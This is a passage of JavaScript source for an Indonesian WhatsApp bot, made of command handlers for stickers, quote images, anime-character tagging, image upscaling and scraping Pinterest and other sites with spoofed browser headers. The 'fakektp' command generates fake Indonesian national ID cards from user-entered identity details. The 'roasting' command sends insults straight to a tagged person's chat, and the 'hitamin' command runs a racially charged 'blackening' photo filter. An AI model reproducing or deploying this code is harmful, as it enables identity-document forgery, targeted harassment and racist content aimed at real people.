    const media = await quoted.download()
    const detect = async (buffer) => {
      const axios = require('axios')
      const BodyForm = require('form-data')
      const { fromBuffer } = require('file-type')
      return new Promise(async (resolve, reject) => {
        try {
          const BASE_URL = "https://smilingwolf-wd-tagger.hf.space/gradio_api"
          const session_hash = Math.random().toString(36).substring(2)
          const file_name = Math.random().toString(36).substring(2)
          const hr = {
            origin: "https://smilingwolf-wd-tagger.hf.space",
            referer: "https://smilingwolf-wd-tagger.hf.space/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "content-type": "application/json",
          }
          const { ext, mime } = (await fromBuffer(buffer)) || {}
          const form = new BodyForm()
          form.append("files", buffer, {
            filename: file_name + "." + ext,
            contentType: mime
          })
          const files = await axios.post(BASE_URL + "/upload?" + new URLSearchParams({
            upload_id: session_hash
          }), form, {
            headers: { ...hr, ...form.getHeaders() }
          }).then(i => i.data)
          const file_res = {
            path: files[0],
            mime_type: mime,
            orig_name: file_name + "." + ext,
            meta: { _type: "gradio.FileData" },
            size: buffer.length,
            url: BASE_URL + "/file=" + files[0],
          }
          await axios.post(BASE_URL + "/queue/join?", {
            data: [
              file_res,
              "SmilingWolf/wd-swinv2-tagger-v3",
              0.35,
              true,
              0.85,
              true
            ],
            event_data: null,
            fn_index: 2,
            session_hash,
            trigger_id: 18,
          })
          const stream = await axios.get(BASE_URL + "/queue/data?" + new URLSearchParams({
            session_hash
          }), {
            headers: { ...hr, "content-type": "text/event-stream" },
            responseType: "stream"
          })
          let result = ''
          stream.data.on('data', (chunk) => {
            result += chunk.toString()
            const lines = result.split('\n')
            result = lines.pop()
            for (const line of lines) {
              if (line.startsWith('data: ')) {
                try {
                  const data = JSON.parse(line.substring(6))
                  if (data.msg !== "process_completed") continue
                  if (!data.success) return resolve({ status: false, data })
                  const dt = data.output.data
                  const is_char = typeof dt[2]?.label === 'string'
                  const res = {
                    prompt: dt[0],
                    rating: dt[1].confidences,
                    character: {
                      name: dt[2]?.label,
                      list: dt[2]?.confidences
                    },
                    tags: {
                      name: dt[3].label,
                      list: dt[3].confidences
                    }
                  }
                  return resolve({
                    status: true,
                    data: res,
                    is_char
                  })
                } catch (err) {
                  console.error('Error parsing JSON:', err)
                  resolve({ status: false, msg: err.message })
                }
              }
            }
          })
        } catch (e) {
          reject(e)
        }
      })
    }
    const res = await detect(media)
    const fixed = num => (num * 100).toFixed(2)
    if (!res.is_char) return m.reply("Tidak terdeteksi karakter di gambar tersebut")
    const teks = `
*⎣⧉⎤ Karakter yang terdeteksi adalah*
> *Nama:* ${res.data.character.name}
> *Persentase:* ${fixed(res.data.character.list[0].confidence || 0)}%
${res.data.character.list.length >= 2 ? `\n*⎣⧉⎤ Karakter lain yang terdeteksi*\n${res.data.character.list.map((it) => `> *Nama:* ${it.label}\n> *Persentase:* ${fixed(it.confidence || 0)}%`).join('\n\n')}\n` : ''}
*⎣⧉⎤ Prompt*
${res.data.prompt}

*⎣⧉⎤ Rating*
${res.data.rating.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}

*⎣⧉⎤ Tag*
${res.data.tags.list.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}
`.trim()
    m.reply(teks)
  } catch (e) {
    console.error(e)
    m.reply(`Terjadi kesalahan saat mendeteksi karakter!\n\n${e.message}`)
  }
}
break

case 'createquote': {
  if (!text) return m.reply('Kirim teks quotesnya!\nContoh: .quoteimg Jangan pernah menyerah, bro.');
  const { createCanvas, loadImage } = require('canvas');
  function wrapText(ctx, text, maxWidth) {
    const words = text.split(' ');
    let lines = [];
    let currentLine = words[0];
    for (let i = 1; i < words.length; i++) {
      const word = words[i];
      const width = ctx.measureText(currentLine + ' ' + word).width;
      if (width < maxWidth) {
        currentLine += ' ' + word;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    lines.push(currentLine);
    return lines;
  }
  async function generateQuoteImage(ppUrl, username, quoteText) {
    const width = 1000;
    const height = 500;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000000';
    ctx.fillRect(0, 0, width, height);
    const avatar = await loadImage(ppUrl);
    ctx.save();
    ctx.beginPath();
    ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
    ctx.closePath();
    ctx.clip();
    ctx.drawImage(avatar, 60, 130, 240, 240);
    ctx.restore();
    ctx.fillStyle = '#ffffff';
    ctx.font = '28px sans-serif';
    let lines = wrapText(ctx, quoteText, 600);
    lines.forEach((line, i) => {
      ctx.fillText(line, 350, 180 + i * 35);
    });
    ctx.fillStyle = '#aaaaaa';
    ctx.font = '22px italic';
    ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
    return canvas.toBuffer();
  }
  let pushname = m.pushName || m.sender.split('@')[0];
  let ppUrl = await luna.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg');
  let buffer = await generateQuoteImage(ppUrl, pushname, text);

  await luna.sendMessage(m.chat, {
    image: buffer,
    caption: `📝 Quote dari *${pushname}*\n\n> Biyu`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });
}
break

case "qc": {
if (!text) return reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await luna.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await luna.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

case "searchsticker": {
    if (!text) return m.reply('Sticker Apa Yg Kamu Cari?')
    Reply('_Sedang Mencari Sticker..._');
    
    try {
        let apiUrl = `https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        const response = await res.json();
        
        if (!response.data?.sticker_url || response.data.sticker_url.length === 0) {
            return m.reply('Tidak ditemukan sticker yang sesuai');
        }

        const packNames = [
            "Sticker Keren ",
            "Sticker Lucu ",
            "Created ",
            "Special Sticker ",
            "Random Sticker ",
            "Koleksi Sticker ",
            "Sticker Pack ",
            "Daily Sticker ",
            "Magic Sticker ",
            "Cute Sticker "
        ];

        let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
                      `- *Title:* ${response.data.title}\n` +
                      `- *Creator:* ${response.creator}\n` +
                      `- *Jumlah Sticker:* ${response.data.sticker_url.length}\n` +
                      `_Mengirim Sticker Harap Tunggu..._`;
        
        await luna.sendMessage(m.chat, { text: packInfo }, { quoted: m });
        let allStickers = [...response.data.sticker_url];
        allStickers.sort(() => Math.random() - 0.5);
        const maxStickers = Math.min(10, allStickers.length);
        let successCount = 0;
        let attemptCount = 0;
        
        while (successCount < maxStickers && attemptCount < allStickers.length) {
            try {
                const stickerUrl = allStickers[attemptCount];
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                
                await luna.sendAsSticker(m.chat, stickerUrl, m, {
                    packname: randomPackname,
                    author: `By ${global.namaOwner}`
                });
                
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (stickerError) {
                console.log(`Error sending sticker:`, stickerError);
            }
            attemptCount++;
        }

        if (successCount < maxStickers) {
            m.reply(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
        } else if (response.data.sticker_url.length > 10) {
            m.reply(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
        }

    } catch (e) {
        console.error('Error in stickersearch:', e);
        m.reply('Terjadi kesalahan saat mencari sticker');
    }
}
break

case 'deepimg': {
 if (!text) return m.reply("Masukkan prompt gambar.")
 m.reply("Sedang memproses gambar, mohon tunggu...")

 try {
const axios = require('axios');
 let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
 prompt: text,
 size: "1024x1024",
 device_id: `dev-${Math.floor(Math.random() * 1000000)}`
 }, {
 headers: {
 "Content-Type": "application/json",
 Origin: "https://deepimg.ai",
 Referer: "https://deepimg.ai/"
 }
 })
 let imageUrl = data?.data?.images?.[0]?.url
 if (!imageUrl) return m.reply("Gagal membuat gambar. Coba ganti promptnya.")
 await luna.sendMessage(m.chat, { 
 image: { url: imageUrl }, 
 caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}` 
 }, { quoted: m })
 } catch (err) {
 console.error(err.response ? err.response.data : err.message)
 m.reply("Terjadi kesalahan saat memproses gambar.")
 }
}
break

case 'apkmod':{
async function getMod(q) {
    try {
        const anu = `https://happymod.com/search.html?q=${q}`;
        const { data } = await axios.get(anu);
        const $ = cheerio.load(data);

        let result = [];

        $(".pdt-app-box").each((_, el) => {
            const title = $(el).find("h3").text().trim();
            const link = "https://happymod.com" + $(el).find('a').attr('href');
            const rate = $(el).find("span.a-search-num").text().trim();

            result.push({ title, link, rate });
        });

        return result;
    } catch (e) {
        console.error(e);
        return [];
    }
}
    if (!text) return m.reply('Mau Cari Aplikasi Apa? \n\n *Example :* .hmod Minecraft');
    luna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try {
        const data = await getMod(text);
        if (data.length === 0) {
            return m.reply('Gak Ketemu');
        }
        let teks = `*[ Happymod Search]*\n\n`;
        for (let i = 0; i < Math.min(data.length, 15); i++) {
            teks += `*${i + 1}. ${data[i].title}*\n`;
            teks += `Rating : ${data[i].rate}\n`;
            teks += `Link : ${data[i].link}\n\n`;
        }
        await luna.sendMessage(m.chat, { image: { url: "https://i.postimg.cc/c6q7zRC8/1741529921037.png" }, caption: teks });
    } catch (error) {
        console.error(error);
        m.reply('Error')
    }
}
break

case 'pin' :
case 'pinfoto': {
const axios = require('axios')
const https = require('https')

const agent = new https.Agent({
 rejectUnauthorized: true,
 maxVersion: 'TLSv1.3',
 minVersion: 'TLSv1.2'
});

async function getCookies() {
 try {
 const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent });
 const setCookieHeaders = response.headers['set-cookie'];
 if (setCookieHeaders) {
 const cookies = setCookieHeaders.map(cookieString => {
 const cookieParts = cookieString.split(';');
 return cookieParts[0].trim();
 });
 return cookies.join('; ');
 }
 return null;
 } catch {
 return null;
 }
}

async function pinterest(query) {
 try {
 const cookies = await getCookies();
 if (!cookies) return [];

 const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
 const params = {
 source_url: `/search/pins/?q=${query}`,
 data: JSON.stringify({
 options: {
 isPrefetch: false,
 query: query,
 scope: "pins",
 no_fetch_context_on_resource: false
 },
 context: {}
 }),
 _: Date.now()
 };

 const headers = {
 'accept': 'application/json, text/javascript, */*, q=0.01',
 'accept-encoding': 'gzip, deflate',
 'accept-language': 'en-US,en;q=0.9',
 'cookie': cookies,
 'dnt': '1',
 'referer': 'https://www.pinterest.com/',
 'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
 'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
 'sec-ch-ua-mobile': '?0',
 'sec-ch-ua-model': '""',
 'sec-ch-ua-platform': '"Windows"',
 'sec-ch-ua-platform-version': '"10.0.0"',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-origin',
 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
 'x-app-version': 'c056fb7',
 'x-pinterest-appstate': 'active',
 'x-pinterest-pws-handler': 'www/[username]/[slug].js',
 'x-pinterest-source-url': '/hargr003/cat-pictures/',
 'x-requested-with': 'XMLHttpRequest'
 };

 const { data } = await axios.get(url, { httpsAgent: agent, headers, params });
 return data.resource_response.data.results
 .filter(v => v.images?.orig)
 .map(result => ({
 upload_by: result.pinner.username,
 fullname: result.pinner.full_name,
 followers: result.pinner.follower_count,
 caption: result.grid_title,
 image: result.images.orig.url,
 source: "https://id.pinterest.com/pin/" + result.id,
 }));
 } catch {
 return [];
 }
}

 if (!text) return m.reply(`*Penggunaan:* ${prefix + command} <query> <jumlah>\n\n*Contoh:* ${prefix + command} anime 3`);
 
 let [query, count] = text.split(' ');
 let imgCount = 5;

 if (text.indexOf(' ') !== -1) {
 const lastWord = text.split(' ').pop();
 if (!isNaN(lastWord) && lastWord.trim() !== '') {
 imgCount = parseInt(lastWord);
 query = text.substring(0, text.lastIndexOf(' '));
 } else {
 query = text;
 }
 } else {
 query = text;
 }
 
 m.reply('Searching Pinterest images...');
 
 try {
 const results = await pinterest(query);
 if (results.length === 0) return reply(`No results found for "${query}". Try another search term.`);
 
 const imagesToSend = Math.min(results.length, imgCount);
 m.reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);
 
 for (let i = 0; i < imagesToSend; i++) {
 await luna.sendMessage(m.chat, { image: { url: results[i].image } });
 }
 } catch {
 m.reply('Error occurred while fetching Pinterest images. Please try again later.');
 }
}
break

case 'playstore': {
if (!text) return m.reply(`${prefix + command} WhatsApp`)
m.reply('Proses..')
await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian PLAY STORE*\n\n'
for (let i of response.result) {
teks += `*◦ Title :* ${i.nama}\n`
teks += `*◦ Developer :* ${i.developer}\n`
teks += `*◦ Rating :* ${i.rate}\n`
teks += `*◦ Link Developer Url :* ${i.link_dev}\n`
teks += `*◦ Link Apps Url :* ${i.link}\n\n`
}
m.reply(teks)
}).catch(err => m.reply('Error 🗿'))
}
break

case 'fakektp': {
    try {
        if (!text) {
            return m.reply(`*Contoh penggunaan:*\n${prefix + command} provinsi|kota|nik|nama|ttl|jenis_kelamin|golongan_darah|alamat|rt/rw|kelurahan|kecamatan|agama|status|pekerjaan|kewarganegaraan|masa_berlaku|terbuat|photo_url\n\n*Format contoh:*\n${prefix + command} Jakarta|Jakarta Timur|31752331637393|Reyz|24-04-2008 Jakarta|laki-laki|AB|jalan bahagia|08/06|Tengah|Kramat jati|Islam|belum menikah|manajer|Indonesia|seumur hidup|21-12-2026|https://cdn.yupra.my.id/yp/vi1275ok.png`);
        }

        await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        const params = text.split('|');
        if (params.length < 18) {
            return m.reply(`*?? Parameter kurang!*\n\nDibutuhkan *18 parameter*, tetapi hanya menerima *${params.length}*.\n*Pastikan urutan parameter sesuai contoh!*`);
        }

        const baseURL = 'https://theresapisv3.vercel.app/canvas/ektp';
        const query = new URLSearchParams({
            provinsi: params[0].trim(),
            kota: params[1].trim(),
            nik: params[2].trim(),
            nama: params[3].trim(),
            ttl: params[4].trim(),
            jenis_kelamin: params[5].trim(),
            golongan_darah: params[6].trim(),
            alamat: params[7].trim(),
            'rt/rw': params[8].trim(),
            'kel/desa': params[9].trim(),
            kecamatan: params[10].trim(),
            agama: params[11].trim(),
            status: params[12].trim(),
            pekerjaan: params[13].trim(),
            kewarganegaraan: params[14].trim(),
            masa_berlaku: params[15].trim(),
            terbuat: params[16].trim(),
            pas_photo: params[17].trim()
        });

        const url = `${baseURL}?${query.toString()}`;
        const response = await fetch(url);
        
        if (!response.ok) {
            Reply (`*🍂 Gagal mengambil gambar!*\n*Status server:* ${response.status} ${response.statusText}`);
        }

        const buffer = await response.arrayBuffer();
        await luna.sendMessage(m.chat, {
            image: Buffer.from(buffer)
        }, { quoted: m });

    } catch (error) {
        m.reply(`*🍂 Terjadi kesalahan!*\n\n*Pesan error:* ${error.message}\n*Tips:* Periksa kembali URL foto atau koneksi internet Anda.`);
    } finally {
        await luna.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
};
break 

case 'dongeng': {
 try {
 const res = await fetch('https://apizell.web.id/random/dongeng');
 const json = await res.json();
 let caption = `*${json.title}*\n_By ${json.author}_\n\n${json.storyContent.replace(/<[^>]*>/g, '').trim()}\n\n*Nasihat:* ${json.storyContent.split('Nasihat :')[1]?.trim() || '-'}`;
 luna.sendMessage(m.chat, {
 image: { url: json.image },
 caption: caption
 }, { quoted: m });
 } catch (e) {
 m.reply('Gagal mengambil dongeng. Coba lagi nanti.');
 console.error(e);
 }
}
 break

case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
 if (!text.includes(',')) return m.reply('Format salah! Gunakan: jarak [kota asal],[kota tujuan]\nContoh: jarak bekasi,madiun');
 
 let [from, to] = text.split(',').map(v => v.trim());
 let biyumaunyepong = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
 try {
 let response = await fetch(biyumaunyepong);
 let data = await response.json();
 if (data.status !== 200) return m.reply('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
 let result = data.result;
 let msg = `📍 *Informasi Jarak* 📍
 
🚗 *Dari:* ${result.asal.alamat} 
📍 *Ke:* ${result.tujuan.alamat} 
📏 *Jarak:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *Estimasi Waktu:* ${result.detail.split('estimasi waktu ')[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Rute Perjalanan:* 
${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
 m.reply(msg);
 } catch (e) {
 console.error(e);
 m.reply('Terjadi kesalahan saat mengambil data!');
 }
 break

case "kucing":
 case "cat": case "randomkucing": {
 await m.reply(mess.wait);
 try {
 const axios = require('axios');
 
 let anu = `https://api.siputzx.my.id/api/r/cats`
 const response = await axios.get(anu, { responseType: 'arraybuffer' });
 
 luna.sendMessage(m.chat,
 {
 image: Buffer.from(response.data),
 caption: "Berhasil Mengambil"
 }, { quoted: m })
 } catch (e) {
 
 console.log(e)
 
 await m.reply("Error")
 }
 }
 break

case "cecan": case "cn": {
 await luna.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
 const apiEndpoints = {
 "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
 "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
 "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
 "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
 "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
 "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
 }
 try {
 const axios = require('axios');
 let araara = new Array()
 const imagesPerCountry = 2
 for (const [country, url] of Object.entries(apiEndpoints)) {
 for (let i = 0; i < imagesPerCountry; i++) {
 try {
 const response = await axios.get(url, { responseType: 'arraybuffer' })
 let imgsc = await prepareWAMessageMedia(
 { image: Buffer.from(response.data) }, 
 { upload: luna.waUploadToServer }
 )
 araara.push({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: true,
 ...imgsc
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [{ 
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"${country} Image ${i + 1}\",\"url\":\"${url}\",\"merchant_url\":\"https://www.google.com\"}`
 }]
 })
 })
 await new Promise(resolve => setTimeout(resolve, 500))
 
 } catch (error) {
 console.error(`Error processing image ${i + 1} for ${country}:`, error)
 continue
 }
 }
 }
 if (araara.length === 0) {
 throw new Error('No valid images found')
 }
 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `\nKoleksi Cecan dari Berbagai Negara\n\n• Indonesia 🇮🇩\n• China 🇨🇳\n• Japan 🇯🇵\n• Korea 🇰🇷\n• Thailand 🇹🇭\n• Vietnam 🇻🇳\n`
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: araara
 })
 })
 }
 }
 }, {userJid: m.sender, quoted: m})

 await luna.relayMessage(m.chat, msgii.message, { 
 messageId: msgii.key.id 
 })
 await luna.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
 } catch (error) {
 console.error('Error:', error)
 await luna.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
 return m.reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
 }
}
break

case 'cogan': {
 try {
 const res = await fetch('https://raw.githubusercontent.com/veann-xyz/result-daniapi/main/cecan/cogan.json');
 const data = await res.json();
 if (!Array.isArray(data)) return m.reply('Data tidak valid.');
 const randomImage = data[Math.floor(Math.random() * data.length)];
 luna.sendMessage(m.chat, {
 image: { url: randomImage },
 caption: 'Nih cogan buat kamu :v'
 }, { quoted: m });
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengambil data cogan.');
 }
 }
 break

case 'roasting':
case 'roasting': {
 let orang = m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : text
 ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : null;
 if (!orang) return m.reply('Tag orang atau ketik nomornya, contoh: *.roast @user* atau *.roast 628xxxx*');
 let ppthumb;
 try {
 ppthumb = await luna.profilePictureUrl(orang, 'image');
 } catch {
 ppthumb = global.image.menu;
 }
 const roastList = [
 `@user, kadang gue mikir, kamu tuh kayak sinyal 1 bar di tengah hutan—nggak berguna tapi selalu muncul pas gak dibutuhin.`,
 `@user, lu tuh kayak charger 15 ribuan—bisa dipake, tapi bikin panas dan ngerusak semuanya.`,
 `@user, kalau otak kamu dijual di marketplace, kemungkinan besar masuk kategori "rusak parah, dijual kiloan".`,
 `@user, kamu kayak WiFi tetangga—kelihatan tapi nggak bisa dipake. Ngeselin banget!`,
 `@user, kalau ngomong tuh kayak lagu remix—banyak noise tapi gak jelas maksudnya.`,
 `@user, kamu itu bukan toxic sih, tapi lebih kayak limbah beracun yang seharusnya dikarantina 40 tahun.`,
 `@user, gaya hidupmu tuh kayak skripsi anak semester 9—jalan di tempat, banyak alasan, hasil nol.`,
 `@user, lu tuh kayak CAPTCHA yang gak bisa ditebak, cuma nyusahin orang doang.`,
 `@user, kalau jadi karakter game, kamu tuh pasti NPC yang ngasih misi gagal dari awal.`,
 `@user, jujur aja... tiap kamu buka mulut, IQ ruangan turun 10 poin.`,
 `@user, muka kamu tuh kayak error 404—nggak ketemu solusinya, bikin stres.`,
 `@user, kalau jadi hewan, kamu pasti masuk kategori hewan mitos, soalnya gak ada yang ngerti eksistensimu.`,
 `@user, kamu tuh kayak alarm jam 5 pagi pas libur—gak penting, cuma ganggu tidur orang.`,
 `@user, IQ kamu tuh kayak ping server merah—tinggi banget tapi gak berguna.`,
 `@user, lu tuh kayak file corrupt—dibuka bikin kesel, dihapus sayang kuota.`,
 `@user, kalau ada lomba jadi beban, lu pasti juara bertahan 5 tahun berturut-turut.`,
 `@user, jokes kamu tuh kayak sinetron azab—maksa, basi, tapi tetep aja nongol.`,
 `@user, ngomong sama lu tuh kayak ngisi CAPTCHA terus gagal, muter-muter gak jelas.`,
 `@user, kalau ketawa lu direkam, bisa dipake buat usir tuyul.`,
 `@user, gaya kamu tuh kayak intro YouTuber 2012—lebay, norak, dan pengen skip.`,
 `@user, lu tuh kayak charger rusak—bisa nyambung tapi nyetrum perasaan orang.`,
 `@user, setiap kamu muncul, vibes-nya kayak error di Windows—tiba-tiba, bikin panik, dan nyusahin.`,
 `@user, kamu itu kayak sandi WiFi yang udah nggak aktif—masih diingat, tapi udah gak guna.`,
 `@user, kamu tuh kayak grup WA keluarga—rame, tapi gak ada faedahnya.`,
 `@user, kalau jadi app, kamu pasti butuh update tiap hari tapi tetep nge-lag.`,
 `@user, tampangmu kayak file zip, kecil tapi isinya berat semua.`,
 `@user, vibes kamu kayak baterai 1%—mau dimanfaatin aja orang males.`,
 `@user, kalau lu jadi sinetron, pasti judulnya *“Anak Durhaka Gagal Update Otak.”*`,
 `@user, lu tuh kayak file download-an gagal—udah nunggu lama, eh error juga.`,
 `@user, otak lu kayak server gratis—down terus tiap dibutuhin.`,
 `@user, kalo jadi emoji, lu tuh pasti "buffering".`,
 `@user, IQ lu kayak koneksi WiFi publik—semua bisa pake, tapi nggak bisa diandalkan.`,
 `@user, tiap kali lu ngomong, grammar dunia ikut menangis.`,
 `@user, kalo jadi film, lu dapet rating 1 bintang dari netizen dan makhluk halus.`,
 `@user, jokes kamu tuh kayak status Facebook 2010—garing, jadul, dan bikin malu.`
 ];
 const roastText = roastList[Math.floor(Math.random() * roastList.length)].replace(/@user/g, `@${orang.split('@')[0]}`);
 try {
 await luna.sendMessage(orang, {
 text: roastText,
 mentions: [orang],
 contextInfo: {
 externalAdReply: {
 title: `${botname} - ${versi} ⚙️`,
 body: `⏱ Runtime: ${runtime(process.uptime())}`,
 thumbnailUrl: ppthumb,
 sourceUrl: `${global.source}`
 }
 }
 });
 } catch (error) {
 console.error("Error saat mengirim pesan:", error);
 m.reply('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
 }
}
break

case "hitamin": {
 if (!/image/.test(mime)) return m.reply("Reply gambar yang mau dihitamin dengan caption *hitamin*");
 const mediaPath = await luna.downloadAndSaveMediaMessage(qmsg);
 const buffer = fs.readFileSync(mediaPath);
 const base64Image = buffer.toString("base64");
 try {
const axios = require('axios');
 const response = await axios({
 url: "https://negro.consulting/api/process-image",
 method: "POST",
 data: {
 filter: "hitam",
 imageData: "data:image/png;base64," + base64Image
 }
 });

 const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
 await luna.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });

 fs.unlinkSync(mediaPath);
 } catch (err) {
 console.log(err);
 m.reply("Gagal memproses gambar.");
 }
}
break

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await luna.downloadAndSaveMediaMessage(qmsg)
await luna.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|??'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await luna.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case "emojigif": {
if (!text) return m.reply(example('😍'))
try {
const axios = require('axios');
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await luna.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case 'remini':
case 'hd2': {
    const availableScaleRatio = [2, 4];

    const imgupscale = {
        req: async (imagePath, scaleRatio) => {
            const FormData = require('form-data');
            const fs = require('fs');
            const axios = require('axios');
            const form = new FormData();
            form.append('myfile', fs.createReadStream(imagePath));
            form.append('scaleRadio', scaleRatio.toString());

            const response = await axios.request({
                method: 'POST',
                url: 'https://get1.imglarger.com/api/UpscalerNew/UploadNew',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/5.37.36',
                    'Accept': 'application/json, text/plain, */*',
                    'origin': 'https://imgupscaler.com',
                    'referer': 'https://imgupscaler.com/',
                    ...form.getHeaders()
                },
                data: form
            });
            return response.data;
        },

        cek: async (code, scaleRatio) => {
            const axios = require('axios');
            const response = await axios.request({
                method: 'POST',
                url: 'https://get1.imglarger.com/api/UpscalerNew/CheckStatusNew',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/5.37.36',
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'origin': 'https://imgupscaler.com',
                    'referer': 'https://imgupscaler.com/'
                },
                data: JSON.stringify({ code, scaleRadio: scaleRatio })
            });
            return response.data;
        },

        upscale: async (imagePath, scaleRatio, maxRetries = 30, retryDelay = 2000) => {
            const uploadResult = await imgupscale.req(imagePath, scaleRatio);
            if (uploadResult.code !== 200) {
                throw new Error(`Upload failed: ${uploadResult.msg}`);
            }

            const { code } = uploadResult.data;
            for (let i = 0; i < maxRetries; i++) {
